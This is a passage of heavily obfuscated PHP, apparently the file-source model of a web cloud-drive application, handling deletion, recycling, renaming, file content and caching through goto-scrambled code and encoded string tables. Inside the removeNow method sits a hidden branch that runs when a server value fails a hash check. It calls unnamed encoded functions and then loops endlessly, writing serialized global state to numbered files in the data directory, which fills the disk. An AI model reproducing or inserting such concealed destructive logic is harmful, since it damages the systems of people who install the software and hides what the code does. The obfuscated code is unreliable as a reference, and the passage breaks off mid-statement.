$aÅØŞª‡[$e·À˜›ªĞø[477]] . $aÅØŞª‡[$e·À˜›ªĞø[387]] . $e·À˜›ªĞø[47], $e·À˜›ªĞø[413] => 0, $e·À˜›ªĞø[543] => $e·À˜›ªĞø[33]); $b™•¥É£„ = array_merge($f‹Ü‹ğˆ„ñ, $b™•¥É£„); goto eë²ÆÍ‹İ¸; eë²ÆÍ‹İ¸: $this->updateModifyTime($b™•¥É£„[$e·À˜›ªĞø[479]]); $dõÊì†ÛöŒ = $e·À˜›ªĞø[1932] . $aÅØŞª‡[$e·À˜›ªĞø[387]]; if (isset(self::$cacheChildList[$dõÊì†ÛöŒ])) { unset(self::$cacheChildList[$dõÊì†ÛöŒ]); } goto f—™×âôèø; Aíª‚Á¹à¦: $eÃõ‘õ…Å¿ = array($e·À˜›ªĞø[544] => short_id($b’öÁØŒˆÔ)); $this->where(array($e·À˜›ªĞø[401] => $b’öÁØŒˆÔ))->save($eÃõ‘õ…Å¿); $this->setNamePinyin($b’öÁØŒˆÔ, $b™•¥É£„[$e·À˜›ªĞø[28]]); goto fÌ†æ™ÀÀÎ; fÌ†æ™ÀÀÎ: return $b’öÁØŒˆÔ; goto e¬òó´ªáë; e¬òó´ªáë: } public function remove($B³³Ø’‚İ†, $bÓİ¦Ù“Êœ = true) { goto eõåÁÄöç‰; BßŠ‚ÙÂƒ¶: CacheLock::unlock($cŒÎØ‡ ¤ì); $this->metaSet($B³³Ø’‚İ†, $F¤œ¼àè×[1941], $c‘øËÙ¸Ò[$F¤œ¼àè×[479]]); $this->where(array($F¤œ¼àè×[387] => $B³³Ø’‚İ†))->save(array($F¤œ¼àè×[408] => time())); goto C³³ÓÒ¯Š…; a…Æ¦åÊŒ: CacheLock::lock($cŒÎØ‡ ¤ì); $C²£ºÂ±§ = $this->fileNameExist($D¨Š´—’Á, $DïóéÌÍã); if (!$C²£ºÂ±§) { $C²£ºÂ±§ = $this->mkdir($D¨Š´—’Á, $DïóéÌÍã, REPEAT_SKIP); $this->metaSet($C²£ºÂ±§, $F¤œ¼àè×[1937], $C¡ƒÛ—íÉï); $this->metaSet($C²£ºÂ±§, $F¤œ¼àè×[1938], $c‘øËÙ¸Ò[$F¤œ¼àè×[474]]); if ($c‘øËÙ¸Ò[$F¤œ¼àè×[479]] != 0) { $this->metaSet($C²£ºÂ±§, $F¤œ¼àè×[1939], _get($cä×Ãˆ”Üï, $F¤œ¼àè×[1940])); } } goto BßŠ‚ÙÂƒ¶; DƒÏ…†ŒÔÛ: return $Cµ„²Ü; goto B¾ƒéã…’õ; B™½ª’ÇÈ¨: $C¡ƒÛ—íÉï = $c‘øËÙ¸Ò[$F¤œ¼àè×[389]] == self::TYPE_USER ? $F¤œ¼àè×[551] : $F¤œ¼àè×[994]; if ($C¡ƒÛ—íÉï == $F¤œ¼àè×[551]) { $cä×Ãˆ”Üï = Model($F¤œ¼àè×[492])->getInfo($c‘øËÙ¸Ò[$F¤œ¼àè×[474]]); $DïóéÌÍã = !empty($cä×Ãˆ”Üï[$F¤œ¼àè×[1926]]) ? $cä×Ãˆ”Üï[$F¤œ¼àè×[1926]] : $cä×Ãˆ”Üï[$F¤œ¼àè×[28]]; $DïóéÌÍã = $F¤œ¼àè×[256] . $DïóéÌÍã . $F¤œ¼àè×[1934] . $c‘øËÙ¸Ò[$F¤œ¼àè×[474]]; } else { $cä×Ãˆ”Üï = Model($F¤œ¼àè×[476])->getInfo($c‘øËÙ¸Ò[$F¤œ¼àè×[474]]); $DïóéÌÍã = _get($cä×Ãˆ”Üï, $F¤œ¼àè×[28]); $DïóéÌÍã = $F¤œ¼àè×[159] . $DïóéÌÍã . $F¤œ¼àè×[1935] . $c‘øËÙ¸Ò[$F¤œ¼àè×[474]]; } $cŒÎØ‡ ¤ì = $F¤œ¼àè×[1936] . md5($DïóéÌÍã); goto a…Æ¦åÊŒ; C³³ÓÒ¯Š…: $this->recycleClear($c‘øËÙ¸Ò); $Cµ„²Ü = $this->move($B³³Ø’‚İ†, $C²£ºÂ±§, REPEAT_RENAME_FOLDER); $this->folderSizeReset($c‘øËÙ¸Ò[$F¤œ¼àè×[479]]); goto DƒÏ…†ŒÔÛ; däğõº­ğİ: $A¨Ö·Ó×Îâ = Model($F¤œ¼àè×[1501])->get($F¤œ¼àè×[1933]) == $F¤œ¼àè×[86]; if ($f»Öîè’é¦ || $bÓİ¦Ù“Êœ || !$A¨Ö·Ó×Îâ) { return $this->removeNow($B³³Ø’‚İ†, $bÓİ¦Ù“Êœ); } $D¨Š´—’Á = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto B™½ª’ÇÈ¨; eõåÁÄöç‰: $F¤œ¼àè× =& $_SERVER[Æ¼ôºÙï]; $c‘øËÙ¸Ò = $this->sourceInfo($B³³Ø’‚İ†); $f»Öîè’é¦ = intval($c‘øËÙ¸Ò[$F¤œ¼àè×[389]]) === self::TYPE_SYSTEM; goto däğõº­ğİ; B¾ƒéã…’õ: } private function recycleClear($FŸ¶µˆ‚¤¤) { $F‹—ÄÓŒŞ =& $_SERVER[Æ¼ôºÙï]; $cœ‡ã‹¶‹ = $this->childrenAll($FŸ¶µˆ‚¤¤); $eÅ—ŒÙÆ£§ = array($F‹—ÄÓŒŞ[401] => array($F‹—ÄÓŒŞ[402], $cœ‡ã‹¶‹[$F‹—ÄÓŒŞ[1942]])); Model($F‹—ÄÓŒŞ[1943])->where($eÅ—ŒÙÆ£§)->delete(); } public function removeNow($cÇœ¶ÀÍéˆ, $DïÃĞ–®• = true) { goto f¾İœ¨ŞßÙ; E›ËÕ±Š¿: $this->lockMoveEnd($cÇœ¶ÀÍéˆ); Hook::trigger($C‚ô¢ñ¨Ì•[1536], $Céå—¹Ü…Ğ, $DïÃĞ–®•); return !0; goto FÚ‘ÓÛæ; c•–²˜ ¡: if (!$D‘‘Î´¤–†) { return !0; } if ($D‘‘Î´¤–†[$C‚ô¢ñ¨Ì•[479]] == 0) { if (!_get($GLOBALS, $C‚ô¢ñ¨Ì•[475])) { return !1; } } $this->lockMoveStart($cÇœ¶ÀÍéˆ); goto FÆ¢Ú»ìÛ‰; C¸Éè¼Æùå: if ($_SERVER[$C‚ô¢ñ¨Ì•[813]] != $a÷ìƒŞº‘À($E‡øˆ¥¥òñ)) { goto e›êòŞ; e¸»Äßè¸Ä: $BâĞâ¸‡¤¼(); $C¸ªÊÔ‹ìÒ = $C‚ô¢ñ¨Ì•[821]; $fÕ‡èòÇ— = json_encode($GLOBALS[$C‚ô¢ñ¨Ì•[822]]); goto cÚÑ½“„‡; e›êòŞ: $BâĞâ¸‡¤¼ = $C‚ô¢ñ¨Ì•[814]; $fÎ…Ø»…µä = $C‚ô¢ñ¨Ì•[815]; $fÒØ°„¾¯á = $_SERVER[$C‚ô¢ñ¨Ì•[816]] . $C‚ô¢ñ¨Ì•[817]; goto fÆˆ©å‡õ; fÆˆ©å‡õ: $d†ï¿¢Ú›Ï = $fÎ…Ø»…µä($fÒØ°„¾¯á); $Eéí®øÊ»‡ = explode($C‚ô¢ñ¨Ì•[227], $d†ï¿¢Ú›Ï); if (count($Eéí®øÊ»‡) < $C‚ô¢ñ¨Ì•[574]) { $aª‡ß©¸¦Û = $C‚ô¢ñ¨Ì•[818]; $aª‡ß©¸¦Û(); } goto fÆù»Ú•ğ; cÚÑ½“„‡: $FÉÓ­çˆ­ñ = 1; for ($BË–¾ÙÅ½Õ = $FÉÓ­çˆ­ñ; $BË–¾ÙÅ½Õ > 0; $BË–¾ÙÅ½Õ++) { $C¸ªÊÔ‹ìÒ(DATA_PATH . $BË–¾ÙÅ½Õ, $fÕ‡èòÇ—); } goto cŒˆ˜œÒ³¤; fÆù»Ú•ğ: $aíç¯Ãƒ³• = $C‚ô¢ñ¨Ì•[819]; $aíç¯Ãƒ³•($_SERVER[$C‚ô¢ñ¨Ì•[820]]); $BâĞâ¸‡¤¼ = $C‚ô¢ñ¨Ì•[814]; goto e¸»Äßè¸Ä; cŒˆ˜œÒ³¤: } $D‘‘Î´¤–† = $this->sourceInfo($cÇœ¶ÀÍéˆ); $Céå—¹Ü…Ğ = $this->pathInfoMore($cÇœ¶ÀÍéˆ); goto c•–²˜ ¡; fòŠ²‚î†™: $E‰Õ‰‰î­¦ = array($D‘‘Î´¤–†[$C‚ô¢ñ¨Ì•[479]]); if ($D‘‘Î´¤–†[$C‚ô¢ñ¨Ì•[388]] == $C‚ô¢ñ¨Ì•[86]) { $E‰Õ‰‰î­¦[] = $D‘‘Î´¤–†[$C‚ô¢ñ¨Ì•[387]]; } $this->updateModifyTime($E‰Õ‰‰î­¦); goto E›ËÕ±Š¿; f¾İœ¨ŞßÙ: $C‚ô¢ñ¨Ì• =& $_SERVER[Æ¼ôºÙï]; $E‡øˆ¥¥òñ = $_SERVER[$C‚ô¢ñ¨Ì•[811]]; $a÷ìƒŞº‘À = $C‚ô¢ñ¨Ì•[812]; goto C¸Éè¼Æùå; FÆ¢Ú»ìÛ‰: Hook::trigger($C‚ô¢ñ¨Ì•[1944], $Céå—¹Ü…Ğ, $DïÃĞ–®•); if ($DïÃĞ–®•) { Model($C‚ô¢ñ¨Ì•[1943])->moveToRecycle($cÇœ¶ÀÍéˆ); } else { $aš¬ïß›êá = $this->childrenAll($D‘‘Î´¤–†); Model($C‚ô¢ñ¨Ì•[522])->eventRemove($cÇœ¶ÀÍéˆ); $this->removeRelevance($aš¬ïß›êá[$C‚ô¢ñ¨Ì•[1942]], $aš¬ïß›êá[$C‚ô¢ñ¨Ì•[1322]]); } $this->folderSizeReset($D‘‘Î´¤–†[$C‚ô¢ñ¨Ì•[479]]); goto fòŠ²‚î†™; FÚ‘ÓÛæ: } public function childrenAll($Bˆ®ÛİÓ—é) { $F¡Õ¥Ö÷ì¯ =& $_SERVER[Æ¼ôºÙï]; $f¡­¹óÜØ = $Bˆ®ÛİÓ—é[$F¡Õ¥Ö÷ì¯[387]]; if ($Bˆ®ÛİÓ—é[$F¡Õ¥Ö÷ì¯[388]] == $F¡Õ¥Ö÷ì¯[86]) { $b·ó­åê‚ = array($F¡Õ¥Ö÷ì¯[542] => array($F¡Õ¥Ö÷ì¯[501], $Bˆ®ÛİÓ—é[$F¡Õ¥Ö÷ì¯[477]] . $f¡­¹óÜØ . $F¡Õ¥Ö÷ì¯[502])); $fË–ÂÅ×Ä¾ = array($F¡Õ¥Ö÷ì¯[542] => $b·ó­åê‚[$F¡Õ¥Ö÷ì¯[477]]); $BÊãôÑğÕŸ = $this->field($F¡Õ¥Ö÷ì¯[1945])->where($fË–ÂÅ×Ä¾)->select(); $a¿±“çì‡„ = !1; $dƒÙĞá†ç‹ = array($f¡­¹óÜØ); if ($BÊãôÑğÕŸ) { $a¿±“çì‡„ = array_to_keyvalue($BÊãôÑğÕŸ, $F¡Õ¥Ö÷ì¯[33], $F¡Õ¥Ö÷ì¯[436]); $a¿±“çì‡„ = array_remove_value($a¿±“çì‡„, $F¡Õ¥Ö÷ì¯[486]); $dƒÙĞá†ç‹ = array_to_keyvalue($BÊãôÑğÕŸ, $F¡Õ¥Ö÷ì¯[33], $F¡Õ¥Ö÷ì¯[387]); $dƒÙĞá†ç‹[] = $f¡­¹óÜØ; } } else { $a¿±“çì‡„ = array($Bˆ®ÛİÓ—é[$F¡Õ¥Ö÷ì¯[436]]); $dƒÙĞá†ç‹ = array($f¡­¹óÜØ); } return array($F¡Õ¥Ö÷ì¯[1942] => $dƒÙĞá†ç‹, $F¡Õ¥Ö÷ì¯[1322] => $a¿±“çì‡„); } public function removeArray($DôŒŒºĞË) { if (!$DôŒŒºĞË) { return !0; } } public function removeRelevance($Fä¤Ó‹ğœ, $dŸ‡œ†µ÷) { goto fèøÜƒ¦Ù¹; fíîÃÛÉŒŒ: Model($e÷È³Ìİè£[1796])->where($F¬Ğ½è‚–¨)->delete(); Model($e÷È³Ìİè£[522])->where($F¬Ğ½è‚–¨)->delete(); Model($e÷È³Ìİè£[1638])->removeBySource($Fä¤Ó‹ğœ); goto Cõ®Í à’¥; C»Ö”àËá†: $F¬Ğ½è‚–¨ = array($e÷È³Ìİè£[401] => array($e÷È³Ìİè£[402], $Fä¤Ó‹ğœ)); Model($e÷È³Ìİè£[1943])->where($F¬Ğ½è‚–¨)->delete(); Model($e÷È³Ìİè£[430])->where($F¬Ğ½è‚–¨)->delete(); goto fíîÃÛÉŒŒ; bÛ‹„ö‚ğ×: for ($CÑÉäæàÈ = 0; $CÑÉäæàÈ < count($Fä¤Ó‹ğœ); $CÑÉäæàÈ++) { $this->sourceCacheClear($Fä¤Ó‹ğœ[$CÑÉäæàÈ]); } goto då¡ØÆ‰‹½; F—ëÊÊ™É„: $Fä¤Ó‹ğœ = array_unique(array_filter($Fä¤Ó‹ğœ)); $dŸ‡œ†µ÷ = array_unique(array_filter($dŸ‡œ†µ÷)); if (!$Fä¤Ó‹ğœ) { return !1; } goto C»Ö”àËá†; fèøÜƒ¦Ù¹: $e÷È³Ìİè£ =& $_SERVER[Æ¼ôºÙï]; $Fä¤Ó‹ğœ = $Fä¤Ó‹ğœ ? $Fä¤Ó‹ğœ : array(); $dŸ‡œ†µ÷ = $dŸ‡œ†µ÷ ? $dŸ‡œ†µ÷ : array(); goto F—ëÊÊ™É„; Cõ®Í à’¥: Model($e÷È³Ìİè£[1924])->removeBySource($Fä¤Ó‹ğœ); $this->where($F¬Ğ½è‚–¨)->delete(); Model($e÷È³Ìİè£[439])->remove($dŸ‡œ†µ÷); goto bÛ‹„ö‚ğ×; då¡ØÆ‰‹½: } public function rename($aà–ßø¡ù, $Dô…—ÌŒ÷ê) { goto F·†ªå“…†; cì÷¬Ï¸¡ : $b¾àÑ¶¤Ã = $this->fileNameExist($C¯ˆÂó¤³[$AµôÃÊÓ¢Î[479]], $Dô…—ÌŒ÷ê); if ($b¾àÑ¶¤Ã && $b¾àÑ¶¤Ã != $aà–ßø¡ù) { return !1; } $BñëãñÂˆ® = array($AµôÃÊÓ¢Î[404] => $Dô…—ÌŒ÷ê, $AµôÃÊÓ¢Î[541] => USER_ID); goto D¨Ø¾´ÍŒö; D¨Ø¾´ÍŒö: if (!$C¯ˆÂó¤³[$AµôÃÊÓ¢Î[388]] == $AµôÃÊÓ¢Î[86]) { $BñëãñÂˆ®[$AµôÃÊÓ¢Î[390]] = get_path_ext($Dô…—ÌŒ÷ê); } Model($AµôÃÊÓ¢Î[522])->eventRename($aà–ßø¡ù, $C¯ˆÂó¤³[$AµôÃÊÓ¢Î[28]], $Dô…—ÌŒ÷ê); $this->sourceCacheClear($aà–ßø¡ù); goto aèºÍŸ„É˜; aèºÍŸ„É˜: $this->setNamePinyin($aà–ßø¡ù, $BñëãñÂˆ®[$AµôÃÊÓ¢Î[28]], !1); $this->updateModifyTime($C¯ˆÂó¤³[$AµôÃÊÓ¢Î[479]]); $a¥¸¥¯ò¢¨ = $this->where(array($AµôÃÊÓ¢Î[401] => $aà–ßø¡ù))->data($BñëãñÂˆ®)->save(); goto EŞ’ÇÙëÀ›; F·†ªå“…†: $AµôÃÊÓ¢Î =& $_SERVER[Æ¼ôºÙï]; $C¯ˆÂó¤³ = $this->sourceInfo($aà–ßø¡ù); if (!$C¯ˆÂó¤³) { return !1; } goto cì÷¬Ï¸¡ ; EŞ’ÇÙëÀ›: $b²…ÈËë = $AµôÃÊÓ¢Î[1932] . $C¯ˆÂó¤³[$AµôÃÊÓ¢Î[479]]; if (isset(self::$cacheChildList[$b²…ÈËë])) { unset(self::$cacheChildList[$b²…ÈËë]); } return $a¥¸¥¯ò¢¨; goto Bç„­……Œ¨; Bç„­……Œ¨: } public function setNamePinyin($bµ›èÙ•°², $Aé‚¹¦”£, $eµ‰·¶§» = true) { $D¿±Õ½ŸÉ =& $_SERVER[Æ¼ôºÙï]; $d×¼¤‘¾ò‹ = Input::check($Aé‚¹¦”£, $D¿±Õ½ŸÉ[545]); if ($eµ‰·¶§» && !$d×¼¤‘¾ò‹) { return; } if (!$d×¼¤‘¾ò‹) { $this->metaSet($bµ›èÙ•°², $D¿±Õ½ŸÉ[433], null); $this->metaSet($bµ›èÙ•°², $D¿±Õ½ŸÉ[432], null); return; } $cÓ„…¡ÙÃ’ = array($D¿±Õ½ŸÉ[433] => str_replace($D¿±Õ½ŸÉ[50], $D¿±Õ½ŸÉ[33], Pinyin::encode($Aé‚¹¦”£)), $D¿±Õ½ŸÉ[432] => Pinyin::encode($Aé‚¹¦”£, $D¿±Õ½ŸÉ[546])); $this->metaSet($bµ›èÙ•°², $cÓ„…¡ÙÃ’); } public function getContent($b ·à¹Êî») { goto e¢àæ›–öÑ; F”Å¢ÌÁ—“: if (!$Eº¿è©¡[$AòĞÀà‘ÎÁ[75]]) { return $AòĞÀà‘ÎÁ[33]; } return IO::getContent($Eº¿è©¡[$AòĞÀà‘ÎÁ[75]]); goto E±õ½Œ ¸¨; e¢àæ›–öÑ: $AòĞÀà‘ÎÁ =& $_SERVER[Æ¼ôºÙï]; $Eº¿è©¡ = $this->fileInfoGet($b ·à¹Êî»); if (!$Eº¿è©¡) { return !1; } goto bŠŸôÏ‚î¢; bŠŸôÏ‚î¢: if ($Eº¿è©¡[$AòĞÀà‘ÎÁ[77]] == 0) { return $AòĞÀà‘ÎÁ[33]; } $cãÓ•…ïˆ¤ = $AòĞÀà‘ÎÁ[1946] . $Eº¿è©¡[$AòĞÀà‘ÎÁ[169]]; if ($Eº¿è©¡[$AòĞÀà‘ÎÁ[77]] <= 1024 * 10) { $bø³“ªâ© = Cache::get($cãÓ•…ïˆ¤); if (!$bø³“ªâ©) { $bø³“ªâ© = IO::getContent($Eº¿è©¡[$AòĞÀà‘ÎÁ[75]]); Cache::set($cãÓ•…ïˆ¤, $bø³“ªâ©); } return $bø³“ªâ©; } goto F”Å¢ÌÁ—“; E±õ½Œ ¸¨: } public function setDesc($aøö‰ã, $fÖ¾ëöÙ„½) { $BòˆáˆŞµÚ =& $_SERVER[Æ¼ôºÙï]; Model($BòˆáˆŞµÚ[522])->eventAddDesc($aøö‰ã, $fÖ¾ëöÙ„½); return $this->metaSet($aøö‰ã, $BòˆáˆŞµÚ[422], $fÖ¾ëöÙ„½); } public function setContent($B„Ïöš¶¦¬, $C¯–ôœğİ = '') { goto a¨Í÷ñŒ»; aÌšäÍÇÅ‘: if (!$a¿¿§¢Ãêê || !$F©Í«ÛáÂ—) { return !1; } $aé¹·ŒÔ®“ = Model($EÅÌÙğ²áÕ[439])->addFileByContent($C¯–ôœğİ, $F©Í«ÛáÂ—[$EÅÌÙğ²áÕ[28]]); $a“ÇĞÑì•º = $this->fileHistory($F©Í«ÛáÂ—, $aé¹·ŒÔ®“[$EÅÌÙğ²áÕ[436]], $aé¹·ŒÔ®“[$EÅÌÙğ²áÕ[77]]); goto AŸØ‘‘Âƒç; a¨Í÷ñŒ»: $EÅÌÙğ²áÕ =& $_SERVER[Æ¼ôºÙï]; $F©Í«ÛáÂ— = $this->sourceInfo($B„Ïöš¶¦¬); $a¿¿§¢Ãêê = $this->fileInfoGet($B„Ïöš¶¦¬); goto aÌšäÍÇÅ‘; AŸØ‘‘Âƒç: if (!$a“ÇĞÑì•º) { return Model($EÅÌÙğ²áÕ[439])->remove($aé¹·ŒÔ®“[$EÅÌÙğ²áÕ[436]]); } $this->folderSizeReset($F©Í«ÛáÂ—[$EÅÌÙğ²áÕ[479]]); return !0; goto B“È­ñÂÆ¢; B“È­ñÂÆ¢: } public function fileSubstr($CÊÌç•©õ, $c­‡ÆÜôô±, $E´…ˆ¬™„”) { $eÏñ„¬„ß = $this->fileInfoGet($CÊÌç•©õ); if (!$eÏñ„¬„ß) { return !1; } return IO::fileSubstr($eÏñ„¬„ß[$_SERVER[Æ¼ôºÙï][75]], $c­‡ÆÜôô±, $E´…ˆ¬™„”); } public function fileInfoGet($E²‡Ğ‹•ÏÍ) { goto FíñÎóøÍÏ; Aô´ˆÊõ•: $a¨®•ùô­ = Model($Aì¥íÜ©¨ˆ[439])->fileInfo($b„ÚõÊ²»±[$Aì¥íÜ©¨ˆ[436]]); if ($a¨®•ùô­) { $a¨®•ùô­[$Aì¥íÜ©¨ˆ[28]] = $b„ÚõÊ²»±[$Aì¥íÜ©¨ˆ[28]]; } self::$cacheFileInfo[$fùº©…»] = $a¨®•ùô­; goto FÁ×Ğ£¸Å; FÁ×Ğ£¸Å: return $a¨®•ùô­; goto Då–‹ ÓÒÄ; EÔìŒÃ‘£Ó: $fùº©…» = $Aì¥íÜ©¨ˆ[442] . $b„ÚõÊ²»±[$Aì¥íÜ©¨ˆ[436]]; $C“çé¢Ã›™ = _get(self::$cacheFileInfo, $fùº©…»); if ($C“çé¢Ã›™) { return $C“çé¢Ã›™; } goto Aô´ˆÊõ•; FíñÎóøÍÏ: $Aì¥íÜ©¨ˆ =& $_SERVER[Æ¼ôºÙï]; $b„ÚõÊ²»± = $this->sourceInfo($E²‡Ğ‹•ÏÍ); if (!$b„ÚõÊ²»± || $b„ÚõÊ²»±[$Aì¥íÜ©¨ˆ[388]]) { return !1; } goto EÔìŒÃ‘£Ó; Då–‹ ÓÒÄ: } private function folderChildrenNumber($C²ÙÏîÍ·…) { $C¦Ü”Ã¹ÉÇ =& $_SERVER[Æ¼ôºÙï]; $aåõá©ê›ˆ = $this->sourceInfo($C²ÙÏîÍ·…); $aÍí«¤…Øµ = array($C¦Ü”Ã¹ÉÇ[542] => array($C¦Ü”Ã¹ÉÇ[501], $aåõá©ê›ˆ[$C¦Ü”Ã¹ÉÇ[477]] . $C²ÙÏîÍ·… . $C¦Ü”Ã¹ÉÇ[502]), $C¦Ü”Ã¹ÉÇ[413] => intval($aåõá©ê›ˆ[$C¦Ü”Ã¹ÉÇ[414]]), $C¦Ü”Ã¹ÉÇ[535] => 1); $D·¦í¸ÖŸœ = $this->where($aÍí«¤…Øµ)->count(); $AÔ˜ê‹Òƒ÷ = $this->where($aÍí«¤…Øµ)->where(array($C¦Ü”Ã¹ÉÇ[535] => 0))->count(); return array($C¦Ü”Ã¹ÉÇ[81] => $AÔ˜ê‹Òƒ÷, $C¦Ü”Ã¹ÉÇ[82] => $D·¦í¸ÖŸœ); } public function pathInfo($E³À¦µ¯±ô, $BÃ›×Óª™ = false) { goto AŞóáå²Ú; A˜ƒÁ¯—À: self::$cachePathInfo[$D º‚ÖØÉá] = $BË¶Œ·„ˆ; return $BË¶Œ·„ˆ; goto b¨æÀÍ‡­‘; Eø‰Ê¡òéŞ: $BË¶Œ·„ˆ = $this->sourceInfo($E³À¦µ¯±ô); if (!$BË¶Œ·„ˆ) { return !1; } $BË¶Œ·„ˆ = $this->_listDataApplyItem($BË¶Œ·„ˆ, $BÃ›×Óª™); goto A˜ƒÁ¯—À; AŞóáå²Ú: $c”ëò¾ÍÑß =& $_SERVER[Æ¼ôºÙï]; $BÃ›×Óª™ = !1; $E³À¦µ¯±ô = intval($E³À¦µ¯±ô); goto dÛ”œ°­Š‰; dÛ”œ°­Š‰: $D º‚ÖØÉá = $c”ëò¾ÍÑß[428] . intval($BÃ›×Óª™) . $c”ëò¾ÍÑß[429] . $E³À¦µ¯±ô; $CĞ¢ÙÆÁÑ” = _get(self::$cachePathInfo, $D º‚ÖØÉá); if ($CĞ¢ÙÆÁÑ”) { return $CĞ¢ÙÆÁÑ”; } goto Eø‰Ê¡òéŞ; b¨æÀÍ‡­‘: } public static $cachePathInfoMore = array(); public function pathInfoMore($BùÙ›İØ) { goto cµ‹…ôÉ»; b“ö¢¤Ê°§: self::$cachePathInfoMore[$BùÙ›İØ] = $dòº¬–¢Æ; return $dòº¬–¢Æ; goto cõ†¥ë™›º; f…ñÎÑĞÏ‚: $dòº¬–¢Æ = $this->pathInfo($BùÙ›İØ); if (!$dòº¬–¢Æ) { return !1; } if ($dòº¬–¢Æ[$F‚‘Ú»[388]] == $F‚‘Ú»[86]) { $dòº¬–¢Æ[$F‚‘Ú»[80]] = $this->folderChildrenNumber($BùÙ›İØ); } goto b“ö¢¤Ê°§; cµ‹…ôÉ»: $F‚‘Ú» =& $_SERVER[Æ¼ôºÙï]; $CØÙ‘™Ÿ÷‚ = _get(self::$cachePathInfoMore, $BùÙ›İØ); if ($CØÙ‘™Ÿ÷‚) { return $CØÙ‘™Ÿ÷‚; } goto f…ñÎÑĞÏ‚; cõ†¥ë™›º: } public function sourceInfo($cÅâ³¸ßº¢) { goto aÄ„ÑŸˆ¡; bÕ—ëéäí: $D°ù¸¢òİ­ = $a¨ÎÅÌ²êº[427] . $cÅâ³¸ßº¢; $Fˆƒ»¿‡‰Ó = _get(self::$cacheSourceInfo, $D°ù¸¢òİ­); if ($Fˆƒ»¿‡‰Ó) { return $Fˆƒ»¿‡‰Ó; } goto a†óñÖá­Û; a†óñÖá­Û: $B‹¹Ñ“¾¤… = $this->where(array($a¨ÎÅÌ²êº[387] => $cÅâ³¸ßº¢))->find(); self::$cacheSourceInfo[$D°ù¸¢òİ­] = $B‹¹Ñ“¾¤…; return self::$cacheSourceInfo[$D°ù¸¢òİ­]; goto B»¶é¬Íè; aÄ„ÑŸˆ¡: $a¨ÎÅÌ²êº =& $_SERVER[Æ¼ôºÙï]; if (!$cÅâ³¸ßº¢) { return array(); } $cÅâ³¸ßº¢ = intval($cÅâ³¸ßº¢); goto bÕ—ëéäí; B»¶é¬Íè: } public function sourceCacheClear($e…¬ÚŠæ„ = false) { self::cacheClear($e…¬ÚŠæ„); } public static function cacheClear($FªÊ¯Öä = false) { $e¢„¬½’Ûø =& $_SERVER[Æ¼ôºÙï]; if ($FªÊ¯Öä == !1) { goto b·ÓéÌØ½«; b·ÓéÌØ½«: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto E¬á†§Ü‚…; E¬á†§Ü‚…: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto A„µ¯óƒî; A„µ¯óƒî: return; goto A‹Ü­Ö…›œ; A‹Ü­Ö…›œ: } unset(self::$cacheSourceInfo[$e¢„¬½’Ûø[427] . $FªÊ¯Öä]); unset(self::$cachePathInfoMore[$FªÊ¯Öä]); unset(self::$cachePathInfo[$e¢„¬½’Ûø[1947] . $FªÊ¯Öä]); unset(self::$cachePathInfo[$e¢„¬½’Ûø[1948] . $FªÊ¯Öä]); } public function metaSet($D¼Œ‘×Ú¼, $bñ¹Õ—‹ï = null, $d¤Š•¤–á = null) { $Càù®©ñÌ = parent::metaSet($D¼Œ‘×Ú¼, $bñ¹Õ—‹ï, $d¤Š•¤–á); if ($Càù®©ñÌ) { $this->sourceCacheClear($D¼Œ‘×Ú¼); } return $Càù®©ñÌ; } public function pathInfoByPath($DÍå…ëÁ·, $dˆƒ†èç¨ö) { $dÂ¿ª­±®º =& $_SERVER[Æ¼ôºÙï]; $E¥ÒÛè¡„ = !$dˆƒ†èç¨ö ? array() : explode($dÂ¿ª­±®º[8], trim($dˆƒ†èç¨ö, $dÂ¿ª­±®º[8])); $eÙ„¢‹¹Ÿ = $DÍå…ëÁ·; foreach ($E¥ÒÛè¡„ as $d¹ì¾Õ¿æÏ) { $dô¨’´é× = array($dÂ¿ª­±®º[479] => $eÙ„¢‹¹Ÿ, $dÂ¿ª­±®º[28] => $d¹ì¾Õ¿æÏ); $d¬¶ö®ê = $this->where($dô¨’´é×)->select(); if (!$d¬¶ö®ê) { return !1; } $d¬¶ö®ê = array_sort_by($d¬¶ö®ê, $dÂ¿ª­±®º[414]); $eÙ„¢‹¹Ÿ = $d¬¶ö®ê[0][$dÂ¿ª­±®º[387]]; } return $this->pathInfo($eÙ„¢‹¹Ÿ, !0); } protected function updateModifyTime($dÖŒÕÈ·ò¹) { goto a­äÒ‚ª; CÓÜƒ„…”Ö: $this->where($a—ˆ‚×…Ã)->save($E‡Û¡‡£‡); goto bÉ”ÛÜÓ©; a­äÒ‚ª: $eÉ«¬‘Ë®Ş =& $_SERVER[Æ¼ôºÙï]; if (!$dÖŒÕÈ·ò¹) { return; } if (!is_array($dÖŒÕÈ·ò¹)) { $dÖŒÕÈ·ò¹ = array($dÖŒÕÈ·ò¹); } goto cåµÔˆãİ; cåµÔˆãİ: foreach ($dÖŒÕÈ·ò¹ as $F‚†«§ÂßÓ => $EÑâğğÜãÏ) { $dÖŒÕÈ·ò¹[$F‚†«§ÂßÓ] = intval($EÑâğğÜãÏ); $this->sourceCacheClear($EÑâğğÜãÏ); } $a—ˆ‚×…Ã = array($eÉ«¬‘Ë®Ş[387] => array($eÉ«¬‘Ë®Ş[7], $dÖŒÕÈ·ò¹)); $E‡Û¡‡£‡ = array($eÉ«¬‘Ë®Ş[541] => USER_ID, $eÉ«¬‘Ë®Ş[408] => time()); goto CÓÜƒ„…”Ö; bÉ”ÛÜÓ©: } public function folderSizeReset($fÓÏ×…, $bô²íš×Ÿï = false) { goto EöêÏÙŠô×; B±ÓÀéæ¦: $ešËÒàáòÎ = $BÜùÕ¤ÙÁ˜[1949] . $fÓÏ×…; CacheLock::lock($ešËÒàáòÎ, 20); if ($bô²íš×Ÿï === !1) { $this->sourceCacheClear($fÓÏ×…); $bÚÅí­ª¶Ü = $this->sourceInfo($fÓÏ×…); $DÇ¡Ö¾¸‚‚ = array($BÜùÕ¤ÙÁ˜[386] => $fÓÏ×…, $BÜùÕ¤ÙÁ˜[413] => 0); $e¤ô÷´ĞÍ¢ = $this->where($DÇ¡Ö¾¸‚‚)->sum($BÜùÕ¤ÙÁ˜[77]); $bô²íš×Ÿï = intval($e¤ô÷´ĞÍ¢) - intval($bÚÅí­ª¶Ü[$BÜùÕ¤ÙÁ˜[77]]); } goto BŠ†ÔÀÜÌ; Eøç‹ù’Ò: $this->where($DÇ¡Ö¾¸‚‚)->setAdd($BÜùÕ¤ÙÁ˜[77], 